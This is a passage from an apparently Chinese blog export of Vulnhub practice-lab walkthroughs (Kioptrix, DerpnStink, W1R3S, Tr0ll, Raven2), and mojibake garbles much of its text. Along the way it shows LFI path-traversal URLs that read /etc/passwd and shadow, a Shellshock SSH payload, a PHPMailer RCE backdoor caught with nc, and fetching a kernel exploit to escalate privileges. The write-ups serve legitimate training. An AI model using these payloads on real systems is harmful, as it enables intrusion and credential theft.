<h1 id="0x03-Kioptrix-Level-1-3"><a href="#0x03-Kioptrix-Level-1-3" class="headerlink" title="0x03 Kioptrix_Level_1.3"></a><strong>0x03 Kioptrix_Level_1.3</strong></h1><p>è¿™ä¸ªåŒ…ä¸‹è½½ä¸‹æ¥æ˜¯ä¸ªvmdk</p>
<p>éœ€è¦æˆ‘ä»¬æŠŠä¸Šä¸€ä¸ªåˆšæ‰“å®Œçš„è™šæ‹Ÿæœºç¡¬ç›˜ç§»é™¤å€’å…¥è¿™ä¸ª</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191650536.png" alt="image-20200307191650536"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191852194.png" alt="image-20200307191852194"></p>
<p>çœ‹çœ‹80 å…ˆä½¿ç”¨nmapé€šè¿‡NetBIOSæšä¸¾ç”¨æˆ·å</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307230439585.png" alt="image-20200307230439585"></p>
<p>æ‰«å‡ºæ¥çš„è´¦æˆ·åŠ ä¸‡èƒ½å¯†ç å°è¯•ç™»é™†</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231412153.png" alt="image-20200307231412153"></p>
<p>æ“ä½œå¦‚ä¸‹</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231835651.png" alt="image-20200307231835651"></p>
<p>æ•°æ®åº“è´¦å·æ‹¿åˆ°</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231942745.png" alt="image-20200307231942745"></p>
<p>ç”¨<strong>sys_exec</strong>è¿è¡Œusermodå‘½ä»¤æ¥æˆäºˆjohnç®¡ç†å‘˜æƒé™ï¼</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307232351752.png" alt="image-20200307232351752"></p>
<p>Root ğŸ˜˜</p>
<h1 id="0x04-Kioptrix-2014"><a href="#0x04-Kioptrix-2014" class="headerlink" title="0x04 Kioptrix 2014"></a><strong>0x04 Kioptrix 2014</strong></h1><p>ä¿¡æ¯æ”¶é›†</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230108891.png" alt="image-20200308230108891"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230743780.png" alt="image-20200308230743780"></p>
<p>ä»…æœ‰80å’Œ8080ç«¯å£å¼€ç€ï¼Œç”¨çš„è¿˜æ˜¯Apache 2.2.21æœåŠ¡çš„</p>
<p>çœ‹æ¥è¿™æŠŠæ˜¯è€ƒçº¯webå•Š </p>
<p>80å•¥ä¹Ÿæ²¡æœ‰ 8080æœ‰é™åˆ¶ï¼Œä»€ä¹ˆæ—¶å€™éƒ½è¦çœ‹ä¸‹robotså’Œæºç  å‘ç°äº†éšè—è·¯å¾„</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230928179.png" alt="image-20200308230928179"></p>
<p>pChartåå°</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231027189.png" alt="image-20200308231027189"></p>
<p>kaliæœä¸‹æ¼æ´ çœ‹ä¸‹expäº†è§£åˆ°æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å« é‚£å°±åŒ…å§</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231214272.png" alt="image-20200308231214272"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231309781.png" alt="image-20200308231309781"></p>
<p>åˆ©ç”¨æ–¹å¼</p>
<p>hxxp://localhost/examples/index.phpï¼ŸAction=View&amp;Script=%2f..%2f..%2fetc/passwd</p>
<p>æˆäº†</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231522658.png" alt="image-20200308231522658"></p>
<p>åŒç†å†çœ‹ä¸‹apacheé…ç½® ä¸ºå•¥8080 banæˆ‘ </p>
<p>å“¦ğŸ˜¯ ç«ç‹4.0çš„UAå°±å¯ä»¥äº† æˆ‘è¿™ç”¨çš„æ˜¯googleçš„æ’ä»¶</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231744308.png" alt="image-20200308231744308"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232050054.png" alt="image-20200308232050054"></p>
<p>phptaxè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p>
<p>msfå¹²å‡€åˆ©ç´¢</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232653182.png" alt="image-20200308232653182"></p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232732265.png" alt="image-20200308232732265"></p>
<p>å·®ä¸ªææƒ ç”¨çš„FreeBSD 9.0</p>
<p>kaliå†æœä¸€ä¸‹ ncä¼ æ–‡ä»¶</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235321104.png" alt="image-20200308235321104"></p>
<p>å¦‚ä¸‹æ“ä½œææƒæˆåŠŸ</p>
<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235715954.png" alt="image-20200308235715954"></p>
<p>è‡³æ­¤Kioptrixå‰§ä¸­ğŸ˜˜</p>
<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DerpnStink</title>
    <url>/2020/03/06/DerpnStink/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p><img src="/2020/03/06/DerpnStink/image-20200306214933101.png" alt="image-20200306214933101"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215044988.png" alt="image-20200306215044988"></p>
<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>80ç«¯å£ç½‘é¡µæºä»£ç 112è¡Œ</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215212457.png" alt="image-20200306215212457"></p>
<h1 id="0x02-è·å–shell"><a href="#0x02-è·å–shell" class="headerlink" title="0x02 è·å–shell"></a><strong>0x02 è·å–shell</strong></h1><p>dirbçˆ†ç ´ä¸€ä¸‹ å‘ç°weblogè·¯å¾„</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215516647.png" alt="image-20200306215516647"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215733208.png" alt="image-20200306215733208"></p>
<p>ä¸è¡Œ çœ‹ä¸‹ä¹‹å‰çš„æºç </p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215758832.png" alt="image-20200306215758832"></p>
<p>æ·»åŠ æœ¬åœ°hosts æ ¹æ®æç¤º</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306215812440.png" alt="image-20200306215812440"></p>
<p>è®¿é—®åå‘ç°æ˜¯ä¸ªwordpress åå°å¸¸è§„è·¯å¾„æ˜¯wp-admin  å¼±å¯†ç admin admin</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306220237585.png" alt="image-20200306220237585"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306220348156.png" alt="image-20200306220348156"></p>
<p>adminéƒ½è¿›å»äº† é‚£å°±ä¸Šmsfå§</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306220953586.png" alt="image-20200306220953586"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306221116509.png" alt="image-20200306221116509"></p>
<p>æ‹¿åˆ°shell</p>
<h1 id="0x03-flag2"><a href="#0x03-flag2" class="headerlink" title="0x03 flag2"></a><strong>0x03 flag2</strong></h1><p>cat /var/www/html/weblog/wp-config.php</p>
<p>æ•°æ®åº“çš„è´¦å·å¯†ç æ‹¿åˆ°</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306221339387.png" alt="image-20200306221339387"></p>
<p>å…¶å®æ˜¯æœ‰phpmyadminç›®å½•çš„ ç¬¬ä¸€æ¬¡çˆ†çš„æ—¶å€™æˆ‘ä¸ºäº†é€Ÿåº¦å°±ä¸­æ–­äº† æˆ‘ä»¬è®¿é—®ä¸‹</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306221712863.png" alt="image-20200306221712863"></p>
<p>æœ‰ä¸ªhash </p>
<p>johnçˆ†ç ´æš´ç ´å‡ºçš„ç”¨æˆ·å/å¯†ç ï¼šunclestinky/wedgie57 </p>
<p>ç™»å½• wordpress flag2åˆ°æ‰‹</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306222011578.png" alt="image-20200306222011578"></p>
<h1 id="0x04-flag3"><a href="#0x04-flag3" class="headerlink" title="0x04 flag3"></a><strong>0x04 flag3</strong></h1><p>å¦‚å›¾ åŸºæ“ï¼ˆç”¨æ–°ç”¨æˆ·ï¼‰</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306222352388.png" alt="image-20200306222352388"></p>
<h1 id="0x05-flag4"><a href="#0x05-flag4" class="headerlink" title="0x05 flag4"></a><strong>0x05 flag4</strong></h1><p>ä½¿ç”¨ ftp ç™»å½•ç³»ç»Ÿ stinky/wedgie57ï¼Œä¸‹è½½pcapåŒ…</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306222737324.png" alt="image-20200306222737324"></p>
<p>å‘ç°ftpæ ¹ç›®å½•æ˜¯files ç”¨shellç§»è¿‡å» pcapåœ¨desktopçš„åŒçº§ç›®å½•documentsä¸‹</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306223312113.png" alt="image-20200306223312113"></p>
<p><img src="/2020/03/06/DerpnStink/image-20200306223453873.png" alt="image-20200306223453873"></p>
<p>é‚£å°±åˆ†æä¸‹å§</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306225549075.png" alt="image-20200306225549075"></p>
<p>å¦ä¸€ä¸ªè´¦å·çš„ç”¨æˆ·åå’Œå¯†ç ä¸ºï¼š mrderp / derpderpderpderpderpderpderp</p>
<p>sshä¸Šå» æšä¸¾ç³»ç»Ÿå‘ç°æç¤ºä¿¡æ¯</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306225938339.png" alt="image-20200306225938339"></p>
<p>sudoä¸€ä¸‹</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306230341042.png" alt="image-20200306230341042"></p>
<p>ä»¥ä¸Šä¿¡æ¯ /home/mrderp/binaries/derpy* ä¸­ï¼šbinaries ç›®å½•ä¸­çš„ä»¥ derpy å¼€å¤´çš„å¯æ‰§è¡Œæ–‡ä»¶å…·æœ‰rootæƒé™ã€‚åˆ›å»ºæ–‡ä»¶ä»¥ææƒ</p>
<p>okçœ‹åˆ°äº†é»æ˜å‰çš„æ›™å…‰</p>
<h1 id="0x06-ææƒ-æ‹¿åˆ°flag4"><a href="#0x06-ææƒ-æ‹¿åˆ°flag4" class="headerlink" title="0x06 ææƒ æ‹¿åˆ°flag4"></a><strong>0x06 ææƒ æ‹¿åˆ°flag4</strong></h1><p>/home/mrderp/ä¸‹åˆ›å»ºbinariesç›®å½• å†åˆ›å»ºderpy.sh æŠŠ/bin/bash echoè¿›å» å¦‚å›¾</p>
<p><img src="/2020/03/06/DerpnStink/image-20200306231054176.png" alt="image-20200306231054176"></p>
<p>ok ä¸‹ä¸€ç¯‡è§</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>W1R3S</title>
    <url>/2020/03/05/W1R3S/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p><img src="/2020/03/05/W1R3S/image-20200305194543215.png" alt="image-20200305194543215"></p>
<p><img src="/2020/03/05/W1R3S/image-20200305194857422.png" alt="image-20200305194857422"></p>
<p>å››ä¸ªç«¯å£ 80å¼€å§‹</p>
<p>apacheçš„é¡µé¢ é‚£å°±æ‰«ä¸€ä¸‹å–½ gobuster</p>
<p><img src="/2020/03/05/W1R3S/image-20200305194943070.png" alt="image-20200305194943070"></p>
<p><img src="/2020/03/05/W1R3S/image-20200305195911173.png" alt="image-20200305195911173"></p>
<p>/wordpresså’Œ/administratorçªç ´ç‚¹</p>
<p>è®¿é—®äº†wordpressï¼Œä¹Ÿæ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚</p>
<p>äºæ˜¯è®¿é—®/administratorï¼Œå‘ç°cmsæ˜¯cuppa æ—¢ç„¶cmséƒ½ç»™äº† é‚£ä½œè€…è‚¯å®šæ˜¯æƒ³è¦æ¼æ´åˆ©ç”¨äº† kaliæœä¸‹</p>
<p><img src="/2020/03/05/W1R3S/image-20200305200011816.png" alt="image-20200305200011816"></p>
<p><img src="/2020/03/05/W1R3S/image-20200305200112394.png" alt="image-20200305200112394"></p>
<p>æ ¹æ®æ–‡ä»¶æç¤ºå‘ç°æœ‰lfiæ¼æ´ï¼Œæ ¹æ®æç¤ºæ„é€ url</p>
<p>curl -s â€“data-urlencode urlConfig=../../../../../../../../../etc/passwd <a href="http://192.168.0.102/administrator/alerts/alertConfigField.php" target="_blank" rel="noopener">http://192.168.0.102/administrator/alerts/alertConfigField.php</a> </p>
<p>å†æ¢æˆshadowè¯•è¯•</p>
<p><img src="/2020/03/05/W1R3S/image-20200305200412146.png" alt="image-20200305200412146"></p>
<p>johnç ´ä¸€ä¸‹</p>
<p><img src="/2020/03/05/W1R3S/image-20200305200716703.png" alt="image-20200305200716703"> </p>
<p>w1r3sç”¨æˆ·computer sshä¸Šå»</p>
<h1 id="0x01-æˆåŠŸç™»é™†"><a href="#0x01-æˆåŠŸç™»é™†" class="headerlink" title="0x01 æˆåŠŸç™»é™†"></a><strong>0x01 æˆåŠŸç™»é™†</strong></h1><p><img src="/2020/03/05/W1R3S/image-20200305202128901.png" alt="image-20200305202128901"></p>
<h1 id="0x02-ææƒ"><a href="#0x02-ææƒ" class="headerlink" title="0x02 ææƒ"></a><strong>0x02 ææƒ</strong></h1><p>è¿™æˆ‘å°±ç¬‘äº† å¯†ç ä¸€æ ·çš„ sudo -l</p>
<p><img src="/2020/03/05/W1R3S/image-20200305202345800.png" alt="image-20200305202345800"></p>
<p>è¿™ä¸ªé¶æœºæ¯”è¾ƒç®€å• å› ä¸ºå‡†å¤‡oscpè€ƒè¯• å¤§ä½¬ç»™çš„ç›®æ ‡34å° æŒ‰é¡ºåºåš </p>
<p>åƒå¤–å–å»äº† åŒ—äº¬åƒä¸å®Œçš„å¤–å–â€¦.</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll: 2</title>
    <url>/2020/03/03/Tr0ll-2/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p>åŒç”Ÿå§Šå¦¹ç¬¬äºŒç¯‡</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303213215791.png" alt="image-20200303213215791"></p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303213349966.png" alt="image-20200303213349966"></p>
<p>å¯ä»¥åœ¨ä¸Šé¢çœ‹åˆ°Nmapæ‰¾åˆ°å¼€æ”¾äº†21ã€22ã€80ç«¯å£</p>
<p>çœ‹ä¸‹80 æŸ¥çœ‹æºç å‘ç°äº†ä½œè€…çš„åå­— é™¤æ­¤ä¹‹å¤–æ²¡ä»€ä¹ˆ ä¸è¿‡åé¢ä¼šç”¨åˆ°çš„ ç•™ç€</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303214727575.png" alt="image-20200303214727575"></p>
<p>ftpè¿›å» ç”¨æˆ·å¯†ç éƒ½æ˜¯ä½œè€…å</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220321566.png" alt="image-20200303220321566"></p>
<p>é‡Œé¢å‘ç°ä¸ªl mao.zipä¸‹è½½ä¸‹æ¥è§£å‹å‘ç°æœ‰å¯†ç  å…ˆç•™ç€  robots.txtå‘ç°å¾ˆå¤šç›®å½• å¯ä»¥ä¿å­˜ä¸‹æ¥ ç”¨dirbåšå­—å…¸æ‰«ä¸€ä¸‹ </p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220724680.png" alt="image-20200303220724680"></p>
<p>ç»“æœ </p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220804705.png" alt="image-20200303220804705"></p>
<p>è¿™ä¸ªè·¯å¾„æˆ‘ä»¬å¯ä»¥æ·±å…¥æä¸€ä¸‹ æºç é‡Œè¿˜è—äº†ä¸ªå›¾ç‰‡ </p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220902152.png" alt="image-20200303220902152"></p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303220954440.png" alt="image-20200303220954440"></p>
<p>æ‹–ç‰‡wgetä¸‹æ¥ tailæ ‡å‡†è¾“å‡ºä¸‹ å¥½åƒåœ¨æ‰“ctfâ€¦.</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303221204273.png" alt="image-20200303221204273"></p>
<p>ç…§ç€ä»–çš„è¯åšå–½ è®¿é—®ä¸‹è·¯å¾„ å‘ç°å¯†ç æœ¬ éƒ½æ˜¯base64 è§£ä¸€ä¸‹æ‹¿å»çˆ†ä¹‹å‰é‚£ä¸ªzip</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303221324637.png" alt="image-20200303221324637"></p>
<p>ä½¿ç”¨fcrackzipå·¥å…·ï¼ˆä¸“é—¨ç”¨æ¥ç ´è§£zipå¯†ç ï¼‰<br>PASSWORD FOUND!!!: pw == ItCantReallyBeThisEasyRightLOL</p>
<p>è§£å‡ºæ¥çš„ catä¸€ä¸‹å‘ç°æ˜¯sshå¯†é’¥ è¯•äº†ä¸€ä¸‹</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303221853545.png" alt="image-20200303221853545"></p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303222203450.png" alt="image-20200303222203450"></p>
<p>è¿™é‡Œçš„æ„æ€æ˜¯ï¼Œé“¾æ¥å¤±æ•ˆäº†ï¼Œå¯ä»¥ç™»å½•éœ€è¦å¤–å£³æ‹¿æƒé™</p>
<p>æ–¹æ³•åœ¨è¿™é‡Œ <a href="https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh</a></p>
<h1 id="0x01-è·å–shell"><a href="#0x01-è·å–shell" class="headerlink" title="0x01 è·å–shell"></a><strong>0x01 è·å–shell</strong></h1><p>å‘½ä»¤ ï¼šssh <a href="mailto:noob@192.168.0.104">noob@192.168.0.104</a> -i noob -t â€œ() { :;}; /bin/bashâ€</p>
<p>å¤šè¯•è¯• çœ‹æˆ‘å¤šæƒ¨â€¦</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303223053104.png" alt="image-20200303223053104"></p>
<p>æˆ‘ä»¬ä½¿ç”¨exploitè¿›è¡Œå‘½ä»¤æ³¨å…¥æ”»å‡»æ‹¿åˆ°åå¼¹shellåœ¨æœ¬åœ°ä¸Š</p>
<p>å¦‚å›¾æå°±è¡Œ</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303223538369.png" alt="image-20200303223538369"></p>
<p>ä½¿ç”¨python -c â€˜import pty; pty.spawn(â€œ/bin/bashâ€)â€™è¿›å…¥noobç”¨æˆ·</p>
<p>ç„¶åå‘½ä»¤ï¼šfind / -perm -4000 2&gt;/dev/null<br>ä½¿ç”¨findæŸ¥çœ‹åº•å±‚ç›®å½•</p>
<p><img src="/2020/03/03/Tr0ll-2/image-20200303223952517.png" alt="image-20200303223952517"></p>
<p>ç¼“å†²åŒºæº¢å‡ºâ€¦.</p>
<p>å‘½ä»¤ï¼šgdb -q r00tï¼ˆåŠ è½½æ‰§è¡Œr00tç¨‹åºå‘ç”Ÿæº¢å‡ºæ—¶æ¥è·Ÿè¸ªEIPçš„å€¼ï¼‰<br>å‘½ä»¤ï¼šset disassembly-flavor intelï¼ˆè½¬æ¢ä¸ºintelæ ¼å¼çš„æ±‡ç¼–ï¼‰<br>å‘½ä»¤ï¼šdisas mainï¼ˆæ˜¾ç¤ºmainå‡½æ•°å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼‰</p>
<p>ä¸‰ä¸ªé—¨ ä¸åŒçš„ä¸‰ä¸ªåŠŸèƒ½ æˆ‘ä»¬æ˜¯éœ€è¦æœ€å¤§çš„æ–‡ä»¶ä¹Ÿå°±æ˜¯è¿”å›ç”¨æˆ·è¾“å‡ºåŠŸèƒ½çš„</p>
<p>æ˜å¤©å†æ </p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Tr0ll: 1</title>
    <url>/2020/03/02/Tr0ll-1/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p>è¿™æ¬¡åˆæ˜¯åŒç”Ÿ ç¬¬ä¸€ç¯‡</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200318055.png" alt="image-20200302200318055"></p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200434911.png" alt="image-20200302200434911"></p>
<p>80ç«¯å£</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200447964.png" alt="image-20200302200447964"></p>
<p>dirbæ‰«ä¸€ä¸‹</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200828953.png" alt="image-20200302200828953"></p>
<p>æŸ¥çœ‹ä¸‹robots</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302200912404.png" alt="image-20200302200912404"></p>
<p>è®¿é—®ä¸‹ å“æˆ‘å» æŒ‘è¡…ï¼Ÿçœ‹æˆ‘ä¸€ä¼šå„¿æ‹¿ä¸‹ç»™ä½ åŠ å¯†ä¸€ä¸‹  80ä¸è¡Œè½¬æˆ˜FTP</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302201028285.png" alt="image-20200302201028285"></p>
<p>ftpæ‹¿ä¸‹pcapæ–‡ä»¶ åˆ†æä¸‹ æœ‰ä¸ªè´¦å· å¦ä¸€ä¸ªåŒ…è¿˜æœ‰ä¸ªä¸çŸ¥é“æ˜¯å•¥çš„ ä¹Ÿè®¸æ˜¯ç›®å½•</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203253733.png" alt="image-20200302203253733"></p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203348293.png" alt="image-20200302203348293"></p>
<p>æœç„¶æ˜¯ä¸ªç›®å½•</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203453329.png" alt="image-20200302203453329"></p>
<p>ä¸‹è½½ æœä¸‹å­—ç¬¦</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203744541.png" alt="image-20200302203744541"></p>
<p>å“ å¿ƒç´¯ å†å»è®¿é—®ä¸‹ ç»ˆäºçŸ¥é“ç›´ç”·ç”·æœ‹å‹é€å¥—å¨ƒ å¥³ç”Ÿå¿ƒé‡Œæ˜¯æ€ä¹ˆæƒ³çš„äº†</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302203917895.png" alt="image-20200302203917895"></p>
<p>ç¬¬ä¸€ä¸ªæ˜¯è´¦å·</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302204142840.png" alt="image-20200302204142840"></p>
<p>ç¬¬äºŒä¸ªæ˜¯å¯†ç </p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302204207188.png" alt="image-20200302204207188"></p>
<p>å¯†ç å›ºå®š ç”¨æˆ·å°±hydraç”¨æ¥åšå­—å…¸è·‘ä¸€ä¸‹ ç»“æœç”¨æˆ·æ˜¯overflow è¿˜æº¢å‡ºâ€¦</p>
<p>ä¸è¡Œå‘¢ï¼å¤´è„‘é£æš´ä¸€ä¸‹ è¿™ä¸ªä½œè€…æˆ‘æ˜¯çœŸæœ good jobæ˜¯å¯¹æˆ‘è¯´çš„ é‚£å°±æ˜¯ç›®å½•åå­—å°±æ˜¯å¯†ç å‘—</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302204733348.png" alt="image-20200302204733348"></p>
<h1 id="0x01-è·å–shell"><a href="#0x01-è·å–shell" class="headerlink" title="0x01 è·å–shell"></a><strong>0x01 è·å–shell</strong></h1><p><img src="/2020/03/02/Tr0ll-1/image-20200302204912179.png" alt="image-20200302204912179"></p>
<p>â€¦.æˆ‘è¿˜èƒ½è¯´ä»€ä¹ˆ</p>
<h1 id="0x02-å†…æ ¸ææƒ"><a href="#0x02-å†…æ ¸ææƒ" class="headerlink" title="0x02 å†…æ ¸ææƒ"></a><strong>0x02 å†…æ ¸ææƒ</strong></h1><p>æ ¹æ®å†…æ ¸ kaliæœä¸‹exp</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302205724077.png" alt="image-20200302205724077"></p>
<p>cpè¿‡æ¥ python3å¼€ä¸ªhttp</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302210024549.png" alt="image-20200302210024549"></p>
<p>wgetè½åœ° è¦å»tmp /ä¸‹ä¸è®©å†™å…¥</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302210247114.png" alt="image-20200302210247114"></p>
<p>ç¼–è¯‘è¿è¡Œ ææƒæˆåŠŸ</p>
<p><img src="/2020/03/02/Tr0ll-1/image-20200302210414249.png" alt="image-20200302210414249"></p>
<p>è¿˜æœ‰å¾ˆå¤šæ–¹æ³•å¦‚è®¡åˆ’ä»»åŠ¡åå¼¹ å¤§å®¶å¯ä»¥è‡ªè¡Œè¯•ä¸‹ </p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Raven2</title>
    <url>/2020/03/02/Raven2/</url>
    <content><![CDATA[<h1 id="0x00-ä¹¦æ¥ä¸Šå›"><a href="#0x00-ä¹¦æ¥ä¸Šå›" class="headerlink" title="0x00 ä¹¦æ¥ä¸Šå›"></a><strong>0x00 ä¹¦æ¥ä¸Šå›</strong></h1><p>Ravenç¬¬äºŒéƒ¨å…¶å®å°±æ˜¯Raven1çš„åŠ å›ºç‰ˆ è¦åˆ©ç”¨phpmalierè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2016-10033ï¼‰</p>
<p>å‰æœŸçš„é‚£äº›å‘ç°æ­¥éª¤æˆ‘ä»¬å°±ä¸åšèµ˜è¿°äº† æ²¡çœ‹è¿‡çš„å¸ˆå‚…ä»¬å¯ä»¥å»çœ‹ä¸‹æˆ‘çš„Raven1é‚£ç« </p>
<h1 id="0x01-phpmailerè¿œç¨‹ä»£ç æ‰§è¡Œ"><a href="#0x01-phpmailerè¿œç¨‹ä»£ç æ‰§è¡Œ" class="headerlink" title="0x01 phpmailerè¿œç¨‹ä»£ç æ‰§è¡Œ"></a><strong>0x01 phpmailerè¿œç¨‹ä»£ç æ‰§è¡Œ</strong></h1><p>åœ¨ <a href="http://192.168.8.126/vendor/PATH" target="_blank" rel="noopener">http://192.168.8.126/vendor/PATH</a> å‘ç°ç¬¬ä¸€ä¸ªflagå’Œç½‘ç«™æ ¹è·¯å¾„ï¼š/var/www/html/</p>
<p><img src="/2020/03/02/Raven2/image-20200302142612649.png" alt="image-20200302142612649"></p>
<p>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}</p>
<p>åœ¨ <a href="http://192.168.0.102/vendor/VERSION" target="_blank" rel="noopener">http://192.168.0.102/vendor/VERSION</a> å‘ç°ç‰ˆæœ¬å·</p>
<p>åœ¨kaliä¸­ searchsploit phpmailer è¿™ä¸ªpyåœ¨æˆ‘ä»¬çš„å°„ç¨‹å†…</p>
<p><img src="/2020/03/02/Raven2/image-20200302143039705.png" alt="image-20200302143039705"></p>
<p>cpè¿‡æ¥ æ”¹ä¸‹ä»£ç   å¤§å®¶éƒ½æ‡‚ </p>
<p><img src="/2020/03/02/Raven2/image-20200302143133899.png" alt="image-20200302143133899"></p>
<p><img src="/2020/03/02/Raven2/image-20200302143547074.png" alt="image-20200302143547074"></p>
<p>è®¿é—®è¿™ä¸ªè·¯å¾„è‡ªåŠ¨ç”Ÿæˆbackdooré‡Œä½ å¡«çš„æ–‡ä»¶ è®¿é—®å°±ä¼šæ‰§è¡Œpayload ncæå‰æ¥ç€</p>
<p><img src="/2020/03/02/Raven2/image-20200302144032371.png" alt="image-20200302144032371"></p>
<p>pythonåˆ‡æ¢åˆ°äº¤äº’å¼shell</p>
<p>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™</p>
